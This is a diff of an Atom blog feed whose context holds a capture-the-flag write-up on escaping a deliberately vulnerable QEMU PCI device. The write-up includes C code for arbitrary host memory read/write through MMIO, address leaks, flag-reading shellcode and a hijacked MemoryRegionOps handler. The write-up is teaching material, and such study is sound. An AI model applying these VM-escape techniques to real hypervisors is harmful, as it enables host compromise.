@@ -1,6 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?> 
 <feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en">
-    <generator uri="https://gohugo.io/" version="0.92.2">Hugo</generator><title type="html"><![CDATA[hypervisor on repr]]></title>
+    <generator uri="https://gohugo.io/" version="0.80.0">Hugo</generator><title type="html"><![CDATA[hypervisor on repr]]></title>
     
         <subtitle type="html"><![CDATA[pwn, RE, crypto stuff]]></subtitle>
     
@@ -8,7 +8,7 @@
     
             <link href="https://nasm.re/tags/hypervisor/" rel="alternate" type="text/html" title="HTML" />
             <link href="https://nasm.re/tags/hypervisor/feed.xml" rel="self" type="application/atom+xml" title="Atom" />
-    <updated>2022-07-29T20:34:46+02:00</updated>
+    <updated>2022-08-01T03:33:42+02:00</updated>
     
         <author>
             <name>nasm</name>
@@ -64,10 +64,10 @@ The <code>flag</code> is located right next to the hypervisor. Go get it!</p>
     </h2>
 </div>
 <p>We got several files:</p>
-<pre tabindex="0"><code>$ ls
+<pre><code>$ ls
 build_qemu.sh  diff_chall.txt  flag  initramfs.cpio.gz  qemu-system-x86_64  run_chall.sh  vmlinuz-5.11.0-38-generic
 </code></pre><p>Apparently, according to the <code>diff_chall.txt</code> , the provided qemu binary is patched with some vulnerable code. Let&rsquo;s take a look at the diff file:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-diff" data-lang="diff"><span class="gh">diff --git a/hw/misc/cloudinspect.c b/hw/misc/cloudinspect.c
+<div class="highlight"><pre class="chroma"><code class="language-diff" data-lang="diff"><span class="gh">diff --git a/hw/misc/cloudinspect.c b/hw/misc/cloudinspect.c
 </span><span class="gh"></span>new file mode 100644
 <span class="gh">index 0000000000..f1c3f84b2a
 </span><span class="gh"></span><span class="gd">--- /dev/null
@@ -313,14 +313,14 @@ build_qemu.sh  diff_chall.txt  flag  initramfs.cpio.gz  qemu-system-x86_64  run_
 <p>Now we know a bit more about PCI devices, we can see that the patched code is a PCI interface between the linux guest operating system and .. <em>nothing</em>. That&rsquo;s just a vulnerable PCI device which allows us to read and write four I/O registers (<code>CNT</code>, <code>SRC</code>, <code>CMD</code> and <code>DST</code>). According to these registers, we can read and write at an arbitrary location. There is a check about the size we&rsquo;re requesting for read / write operations at a particular offset from the <code>dmabuf</code> base address, but since we control the offset it does not matter.</p>
 <p>To write these registers from userland, we need to <code>mmap</code> the right <code>resource</code> file corresponding to the PCI device. Then we just have to read or write the mapped file at an offset corresponding to the the register we want to read / write. Furthermore, the arbitrary read / write primitives provided by the device need to read to / from a memory area from its physical address the data we want to read / write.</p>
 <p>The resource file can be found by getting a shell on the machine to take a look at the output of the <code>lspci</code> command.</p>
-<pre tabindex="0"><code>/ # lspci -v
+<pre><code>/ # lspci -v
 00:01.0 Class 0601: 8086:7000
 00:00.0 Class 0600: 8086:1237
 00:01.3 Class 0680: 8086:7113
 00:01.1 Class 0101: 8086:7010
 00:02.0 Class 00ff: 1337:1337
 </code></pre><p>The output of the command is structured like this:</p>
-<pre tabindex="0"><code>Field 1 : 00:02.0 : bus number (00), device number (02) and function (0)
+<pre><code>Field 1 : 00:02.0 : bus number (00), device number (02) and function (0)
 Field 2 : 00ff    : device class
 Field 3 : 1337    : vendor ID
 Field 4 : 1337    : device ID
@@ -340,20 +340,20 @@ Field 4 : 1337    : device ID
   
   >here</a
 >. The virt2phys function looks like this:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kt">uint64_t</span> <span class="nf">virt2phys</span><span class="p">(</span><span class="kt">void</span><span class="o">*</span> <span class="n">p</span><span class="p">)</span>
+<div class="highlight"><pre class="chroma"><code class="language-c" data-lang="c"><span class="n">uint64_t</span> <span class="nf">virt2phys</span><span class="p">(</span><span class="kt">void</span><span class="o">*</span> <span class="n">p</span><span class="p">)</span>
 <span class="p">{</span>
-		<span class="kt">uint64_t</span> <span class="n">virt</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint64_t</span><span class="p">)</span><span class="n">p</span><span class="p">;</span>
+		<span class="n">uint64_t</span> <span class="n">virt</span> <span class="o">=</span> <span class="p">(</span><span class="n">uint64_t</span><span class="p">)</span><span class="n">p</span><span class="p">;</span>
 		<span class="n">assert</span><span class="p">((</span><span class="n">virt</span> <span class="o">&amp;</span> <span class="mh">0xfff</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">);</span>
 		<span class="kt">int</span> <span class="n">fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="s">&#34;/proc/self/pagemap&#34;</span><span class="p">,</span> <span class="n">O_RDONLY</span><span class="p">);</span>
 		<span class="k">if</span> <span class="p">(</span><span class="n">fd</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
 				<span class="n">perror</span><span class="p">(</span><span class="s">&#34;open&#34;</span><span class="p">);</span>
-		<span class="kt">uint64_t</span> <span class="n">offset</span> <span class="o">=</span> <span class="p">(</span><span class="n">virt</span> <span class="o">/</span> <span class="mh">0x1000</span><span class="p">)</span> <span class="o">*</span> <span class="mi">8</span><span class="p">;</span>
+		<span class="n">uint64_t</span> <span class="n">offset</span> <span class="o">=</span> <span class="p">(</span><span class="n">virt</span> <span class="o">/</span> <span class="mh">0x1000</span><span class="p">)</span> <span class="o">*</span> <span class="mi">8</span><span class="p">;</span>
 		<span class="c1">// the pagemap associates each mapped page of the virtual address space 
 </span><span class="c1"></span>		<span class="c1">// with its PTE entry, the entry corresponding to the page is at address / PAGE_SZ
 </span><span class="c1"></span>		<span class="c1">// and because that&#39;s an array of 64 bits entry, to access the right entry, the
 </span><span class="c1"></span>		<span class="c1">// offset is multiplied per 8. 
 </span><span class="c1"></span>		<span class="n">lseek</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">offset</span><span class="p">,</span> <span class="n">SEEK_SET</span><span class="p">);</span>
-		<span class="kt">uint64_t</span> <span class="n">phys</span><span class="p">;</span>
+		<span class="n">uint64_t</span> <span class="n">phys</span><span class="p">;</span>
 		<span class="k">if</span> <span class="p">(</span><span class="n">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">phys</span><span class="p">,</span> <span class="mi">8</span> <span class="p">)</span> <span class="o">!=</span> <span class="mi">8</span><span class="p">)</span>
 				<span class="n">perror</span><span class="p">(</span><span class="s">&#34;read&#34;</span><span class="p">);</span>
 		<span class="n">assert</span><span class="p">(</span><span class="n">phys</span> <span class="o">&amp;</span> <span class="p">(</span><span class="mi">1ULL</span> <span class="o">&lt;&lt;</span> <span class="mi">63</span><span class="p">));</span>
@@ -363,7 +363,7 @@ Field 4 : 1337    : device ID
 </span><span class="c1"></span>		<span class="k">return</span> <span class="n">phys</span><span class="p">;</span>
 <span class="p">}</span>
 </code></pre></div><p>To interact with the device we can write the code right bellow:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="cp">#include</span> <span class="cpf">&lt;assert.h&gt;</span><span class="cp">
+<div class="highlight"><pre class="chroma"><code class="language-c" data-lang="c"><span class="cp">#include</span> <span class="cpf">&lt;assert.h&gt;</span><span class="cp">
 </span><span class="cp">#include</span> <span class="cpf">&lt;fcntl.h&gt;</span><span class="cp">
 </span><span class="cp">#include</span> <span class="cpf">&lt;inttypes.h&gt;</span><span class="cp">
 </span><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
@@ -376,23 +376,23 @@ Field 4 : 1337    : device ID
 </span><span class="cp"></span>
 <span class="kt">unsigned</span> <span class="kt">char</span><span class="o">*</span> <span class="n">iomem</span><span class="p">;</span>
 <span class="kt">unsigned</span> <span class="kt">char</span><span class="o">*</span> <span class="n">dmabuf</span><span class="p">;</span>
-<span class="kt">uint64_t</span> <span class="n">dmabuf_phys_addr</span><span class="p">;</span>
+<span class="n">uint64_t</span> <span class="n">dmabuf_phys_addr</span><span class="p">;</span>
 <span class="kt">int</span> <span class="n">fd</span><span class="p">;</span>
 
 <span class="cp">#define PATH &#34;/sys/devices/pci0000:00/0000:00:02.0/resource0&#34;
 </span><span class="cp"></span>
-<span class="kt">void</span> <span class="nf">iowrite</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">addr</span><span class="p">,</span> <span class="kt">uint64_t</span> <span class="n">value</span><span class="p">)</span>
+<span class="kt">void</span> <span class="nf">iowrite</span><span class="p">(</span><span class="n">uint64_t</span> <span class="n">addr</span><span class="p">,</span> <span class="n">uint64_t</span> <span class="n">value</span><span class="p">)</span>
 <span class="p">{</span>
-		<span class="o">*</span><span class="p">((</span><span class="kt">uint64_t</span><span class="o">*</span><span class="p">)(</span><span class="n">iomem</span> <span class="o">+</span> <span class="n">addr</span><span class="p">))</span> <span class="o">=</span> <span class="n">value</span><span class="p">;</span>
+		<span class="o">*</span><span class="p">((</span><span class="n">uint64_t</span><span class="o">*</span><span class="p">)(</span><span class="n">iomem</span> <span class="o">+</span> <span class="n">addr</span><span class="p">))</span> <span class="o">=</span> <span class="n">value</span><span class="p">;</span>
 <span class="p">}</span>
 
-<span class="kt">uint64_t</span> <span class="nf">ioread</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">addr</span><span class="p">)</span>
+<span class="n">uint64_t</span> <span class="nf">ioread</span><span class="p">(</span><span class="n">uint64_t</span> <span class="n">addr</span><span class="p">)</span>
 <span class="p">{</span>
-		<span class="k">return</span> <span class="o">*</span><span class="p">((</span><span class="kt">uint64_t</span><span class="o">*</span><span class="p">)(</span><span class="n">iomem</span> <span class="o">+</span> <span class="n">addr</span><span class="p">));</span>
+		<span class="k">return</span> <span class="o">*</span><span class="p">((</span><span class="n">uint64_t</span><span class="o">*</span><span class="p">)(</span><span class="n">iomem</span> <span class="o">+</span> <span class="n">addr</span><span class="p">));</span>
 <span class="p">}</span>
 
-<span class="kt">uint64_t</span> <span class="nf">write_dmabuf</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">offt</span><span class="p">,</span> <span class="kt">uint64_t</span> <span class="n">value</span><span class="p">)</span> <span class="p">{</span>
-		<span class="o">*</span><span class="p">(</span><span class="kt">uint64_t</span><span class="o">*</span> <span class="p">)</span><span class="n">dmabuf</span> <span class="o">=</span> <span class="n">value</span><span class="p">;</span>
+<span class="n">uint64_t</span> <span class="nf">write_dmabuf</span><span class="p">(</span><span class="n">uint64_t</span> <span class="n">offt</span><span class="p">,</span> <span class="n">uint64_t</span> <span class="n">value</span><span class="p">)</span> <span class="p">{</span>
+		<span class="o">*</span><span class="p">(</span><span class="n">uint64_t</span><span class="o">*</span> <span class="p">)</span><span class="n">dmabuf</span> <span class="o">=</span> <span class="n">value</span><span class="p">;</span>
 		<span class="n">iowrite</span><span class="p">(</span><span class="n">CLOUDINSPECT_MMIO_OFFSET_CMD</span><span class="p">,</span> <span class="n">CLOUDINSPECT_DMA_PUT_VALUE</span><span class="p">);</span>
 		<span class="n">iowrite</span><span class="p">(</span><span class="n">CLOUDINSPECT_MMIO_OFFSET_DST</span><span class="p">,</span> <span class="n">offt</span><span class="p">);</span>
 		<span class="n">iowrite</span><span class="p">(</span><span class="n">CLOUDINSPECT_MMIO_OFFSET_CNT</span><span class="p">,</span> <span class="mi">8</span><span class="p">);</span>
@@ -401,13 +401,13 @@ Field 4 : 1337    : device ID
 		<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
 <span class="p">}</span>
 
-<span class="kt">uint64_t</span> <span class="nf">read_offt</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">offt</span><span class="p">)</span> <span class="p">{</span>
+<span class="n">uint64_t</span> <span class="nf">read_offt</span><span class="p">(</span><span class="n">uint64_t</span> <span class="n">offt</span><span class="p">)</span> <span class="p">{</span>
 		<span class="n">iowrite</span><span class="p">(</span><span class="n">CLOUDINSPECT_MMIO_OFFSET_CMD</span><span class="p">,</span> <span class="n">CLOUDINSPECT_DMA_PUT_VALUE</span><span class="p">);</span>
 		<span class="n">iowrite</span><span class="p">(</span><span class="n">CLOUDINSPECT_MMIO_OFFSET_SRC</span><span class="p">,</span> <span class="n">offt</span><span class="p">);</span>
 		<span class="n">iowrite</span><span class="p">(</span><span class="n">CLOUDINSPECT_MMIO_OFFSET_CNT</span><span class="p">,</span> <span class="mi">8</span><span class="p">);</span>
 		<span class="n">iowrite</span><span class="p">(</span><span class="n">CLOUDINSPECT_MMIO_OFFSET_DST</span><span class="p">,</span> <span class="n">dmabuf_phys_addr</span><span class="p">);</span>
 		<span class="n">ioread</span><span class="p">(</span><span class="n">CLOUDINSPECT_MMIO_OFFSET_TRIGGER</span><span class="p">);</span>
-		<span class="k">return</span> <span class="o">*</span><span class="p">(</span><span class="kt">uint64_t</span><span class="o">*</span> <span class="p">)</span><span class="n">dmabuf</span><span class="p">;</span>
+		<span class="k">return</span> <span class="o">*</span><span class="p">(</span><span class="n">uint64_t</span><span class="o">*</span> <span class="p">)</span><span class="n">dmabuf</span><span class="p">;</span>
 <span class="p">}</span>
 
 <span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
@@ -475,7 +475,7 @@ Field 4 : 1337    : device ID
     </h3>
 </div>
 <p>To see where we can find pointers to the rwx memory area, we can make use of the <code>search</code> command in <code>pwndbg</code>:</p>
-<pre tabindex="0"><code>pwndbg&gt; vmmap                                                                                                                                                                              
+<pre><code>pwndbg&gt; vmmap                                                                                                                                                                              
 LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA                                                                                                                                            
     0x559a884e1000     0x559a88791000 r--p   2b0000 0      /home/nasm/r2s/ctf/2021/hack.lu/pwn/cloudinspect/qemu-system-x86_64                                                                 
     0x559a88791000     0x559a88c5d000 r-xp   4cc000 2b0000 /home/nasm/r2s/ctf/2021/hack.lu/pwn/cloudinspect/qemu-system-x86_64                                                                 
@@ -518,13 +518,13 @@ pwndbg&gt; search -4 0x7fc60400 -w
 </li>
 </ul>
 <p>Then we can write this code:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="c1">// offset I got in gdb locally
-</span><span class="c1"></span><span class="kt">uint64_t</span> <span class="n">base</span> <span class="o">=</span> <span class="n">read_offt</span><span class="p">(</span><span class="mh">0x10c0</span> <span class="o">+</span> <span class="mi">8</span><span class="o">*</span><span class="mi">3</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0xdef90</span><span class="p">;</span> <span class="c1">// heap leak
-</span><span class="c1"></span><span class="kt">uint64_t</span> <span class="n">bss</span> <span class="o">=</span> <span class="n">base</span> <span class="o">+</span> <span class="mh">0xbc2000</span><span class="p">;</span> <span class="c1">// points to the anonnymous memory area right after the binary
-</span><span class="c1"></span><span class="kt">uint64_t</span> <span class="n">heap_base</span> <span class="o">=</span> <span class="n">read_offt</span><span class="p">(</span><span class="mh">0x1000</span> <span class="o">+</span> <span class="mi">8</span><span class="o">*</span><span class="mi">3</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0xf3bff0</span><span class="p">;</span> <span class="c1">// useless
-</span><span class="c1"></span><span class="kt">uint64_t</span> <span class="n">ops_struct</span> <span class="o">=</span> <span class="n">read_offt</span><span class="p">(</span><span class="o">-</span><span class="mh">0xd0</span><span class="p">);</span> <span class="c1">// That&#39;s &amp;ClouInspctState.mmio.ops
-</span><span class="c1"></span><span class="kt">uint64_t</span> <span class="n">addr_obj</span> <span class="o">=</span> <span class="n">read_offt</span><span class="p">(</span><span class="o">-</span><span class="p">(</span><span class="mh">0xd0</span><span class="o">-</span><span class="mi">8</span><span class="p">))</span> <span class="o">+</span> <span class="mi">2568</span><span class="p">;</span> <span class="c1">// CloudInspectState.mmio.opaque
-</span><span class="c1"></span><span class="kt">uint64_t</span> <span class="n">leak_rwx</span> <span class="o">=</span> <span class="n">read_offt</span><span class="p">((</span><span class="n">bss</span> <span class="o">+</span> <span class="mh">0x6000</span><span class="p">)</span> <span class="o">-</span> <span class="n">addr_obj</span><span class="p">)</span> <span class="o">&amp;</span> <span class="o">~</span><span class="mh">0xffff</span><span class="p">;</span> <span class="c1">// leak in the bss
+<div class="highlight"><pre class="chroma"><code class="language-c" data-lang="c"><span class="c1">// offset I got in gdb locally
+</span><span class="c1"></span><span class="n">uint64_t</span> <span class="n">base</span> <span class="o">=</span> <span class="n">read_offt</span><span class="p">(</span><span class="mh">0x10c0</span> <span class="o">+</span> <span class="mi">8</span><span class="o">*</span><span class="mi">3</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0xdef90</span><span class="p">;</span> <span class="c1">// heap leak
+</span><span class="c1"></span><span class="n">uint64_t</span> <span class="n">bss</span> <span class="o">=</span> <span class="n">base</span> <span class="o">+</span> <span class="mh">0xbc2000</span><span class="p">;</span> <span class="c1">// points to the anonnymous memory area right after the binary
+</span><span class="c1"></span><span class="n">uint64_t</span> <span class="n">heap_base</span> <span class="o">=</span> <span class="n">read_offt</span><span class="p">(</span><span class="mh">0x1000</span> <span class="o">+</span> <span class="mi">8</span><span class="o">*</span><span class="mi">3</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0xf3bff0</span><span class="p">;</span> <span class="c1">// useless
+</span><span class="c1"></span><span class="n">uint64_t</span> <span class="n">ops_struct</span> <span class="o">=</span> <span class="n">read_offt</span><span class="p">(</span><span class="o">-</span><span class="mh">0xd0</span><span class="p">);</span> <span class="c1">// That&#39;s &amp;ClouInspctState.mmio.ops
+</span><span class="c1"></span><span class="n">uint64_t</span> <span class="n">addr_obj</span> <span class="o">=</span> <span class="n">read_offt</span><span class="p">(</span><span class="o">-</span><span class="p">(</span><span class="mh">0xd0</span><span class="o">-</span><span class="mi">8</span><span class="p">))</span> <span class="o">+</span> <span class="mi">2568</span><span class="p">;</span> <span class="c1">// CloudInspectState.mmio.opaque
+</span><span class="c1"></span><span class="n">uint64_t</span> <span class="n">leak_rwx</span> <span class="o">=</span> <span class="n">read_offt</span><span class="p">((</span><span class="n">bss</span> <span class="o">+</span> <span class="mh">0x6000</span><span class="p">)</span> <span class="o">-</span> <span class="n">addr_obj</span><span class="p">)</span> <span class="o">&amp;</span> <span class="o">~</span><span class="mh">0xffff</span><span class="p">;</span> <span class="c1">// leak in the bss
 </span><span class="c1"></span>
 <span class="n">printf</span><span class="p">(</span><span class="s">&#34;[*] ops_struct: %lx</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">ops_struct</span><span class="p">);</span>
 <span class="n">printf</span><span class="p">(</span><span class="s">&#34;[*] Binary base address: %lx</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">base</span><span class="p">);</span>
@@ -548,7 +548,7 @@ pwndbg&gt; search -4 0x7fc60400 -w
     </h3>
 </div>
 <p>I choose to write a shellcode to read the flag at <code>leak_rwx + 0x5000</code>, a known location we can easily read and print from the program. The shellcode is very simple:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-nasm" data-lang="nasm"><span class="nf">mov</span> <span class="nb">rax</span><span class="p">,</span> <span class="mi">2</span> <span class="c1">; SYS_open</span>
+<div class="highlight"><pre class="chroma"><code class="language-nasm" data-lang="nasm"><span class="nf">mov</span> <span class="nb">rax</span><span class="p">,</span> <span class="mi">2</span> <span class="c1">; SYS_open</span>
 <span class="nf">push</span> <span class="mh">0x67616c66</span> <span class="c1">; flag in little endian</span>
 <span class="nf">mov</span> <span class="nb">rdi</span><span class="p">,</span> <span class="nb">rsp</span> <span class="c1">; pointer flag string</span>
 <span class="nf">mov</span> <span class="nb">rsi</span><span class="p">,</span> <span class="mi">0</span> <span class="c1">; O_READ</span>
@@ -564,7 +564,7 @@ pwndbg&gt; search -4 0x7fc60400 -w
 <span class="nf">add</span> <span class="nb">rsp</span><span class="p">,</span> <span class="mi">8</span><span class="c1">; we pushed the flag str so we destroy it</span>
 <span class="nf">ret</span> <span class="c1">; return to continue the execution</span>
 </code></pre></div><p>To write the shellcode at <code>leak_rwx + 0x1000</code>, we can directly trigger a large write primitive:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="cp">#define CODE &#34;\x48\xc7\xc0\x02\x00\x00\x00\x68\x66\x6c\x61\x67\x48\x89\xe7\x48\xc7\xc6\x00\x00\x00\x00\x48\xc7\xc2\xfd\x01\x00\x00\x0f\x05\x48\x89\xc7\x48\x31\xc0\x48\x8d\x35\x00\x00\x00\x00\x48\x81\xe6\x00\x00\x00\xff\x48\x81\xc6\x00\x50\x00\x00\x48\xc7\xc2\x30\x00\x00\x00\x0f\x05\x48\x83\xc4\x08\xc3&#34;
+<div class="highlight"><pre class="chroma"><code class="language-c" data-lang="c"><span class="cp">#define CODE &#34;\x48\xc7\xc0\x02\x00\x00\x00\x68\x66\x6c\x61\x67\x48\x89\xe7\x48\xc7\xc6\x00\x00\x00\x00\x48\xc7\xc2\xfd\x01\x00\x00\x0f\x05\x48\x89\xc7\x48\x31\xc0\x48\x8d\x35\x00\x00\x00\x00\x48\x81\xe6\x00\x00\x00\xff\x48\x81\xc6\x00\x50\x00\x00\x48\xc7\xc2\x30\x00\x00\x00\x0f\x05\x48\x83\xc4\x08\xc3&#34;
 </span><span class="cp"></span>
 <span class="n">memcpy</span><span class="p">(</span><span class="n">dmabuf</span><span class="p">,</span> <span class="n">CODE</span><span class="p">,</span> <span class="mi">130</span><span class="p">);</span>
 
@@ -586,7 +586,7 @@ pwndbg&gt; search -4 0x7fc60400 -w
     </h3>
 </div>
 <p>To cratf a fake <code>MemoryRegionOps</code>, I just read the original <code>MemoryRegionOps</code> structure, I edited the <code>read</code> handler, and I wrote it back, in a writable memory area, at <code>leak_rwx+0x2000</code>. Given that <code>sizeof(MemoryRegionOps)</code> is not superior to <code>DMA_SIZE</code>, I can read and write in one time. Then we got:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="c1">// Craft fake MemoryRegionOps structure by reading the original one
+<div class="highlight"><pre class="chroma"><code class="language-c" data-lang="c"><span class="c1">// Craft fake MemoryRegionOps structure by reading the original one
 </span><span class="c1"></span>
 <span class="k">struct</span> <span class="n">MemoryRegionOps</span> <span class="n">fake_ops</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
 <span class="n">printf</span><span class="p">(</span><span class="s">&#34;[*] reading struct mmio.MemoryRegionOps @ %lx</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">ops_struct</span><span class="p">);</span>
@@ -621,7 +621,7 @@ pwndbg&gt; search -4 0x7fc60400 -w
 </div>
 <p>We just have to replace the original <code>CoudInspect.mmio.ops</code> pointer to a pointer to the <code>fake_ops</code> structure.
 Then, next time we send a read request, the shellcode will be executed! And we will just need to retablish the original <code>CoudInspect.mmio.ops</code> pointer to read the flag at <code>leak_rwx+0x5000</code>! Which gives:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="n">write_dmabuf</span><span class="p">(</span><span class="o">-</span><span class="mh">0xd0</span><span class="p">,</span> <span class="n">leak_rwx</span><span class="o">+</span><span class="mh">0x2000</span><span class="p">);</span>
+<div class="highlight"><pre class="chroma"><code class="language-c" data-lang="c"><span class="n">write_dmabuf</span><span class="p">(</span><span class="o">-</span><span class="mh">0xd0</span><span class="p">,</span> <span class="n">leak_rwx</span><span class="o">+</span><span class="mh">0x2000</span><span class="p">);</span>
 <span class="c1">// Set the pointer to the MemoryRegionOps to the fake MemoryRegionOps	
 </span><span class="c1"></span>
 <span class="n">ioread</span><span class="p">(</span><span class="mh">0x37</span><span class="p">);</span> <span class="c1">// trigger the read handler we control, then the shellcode is 
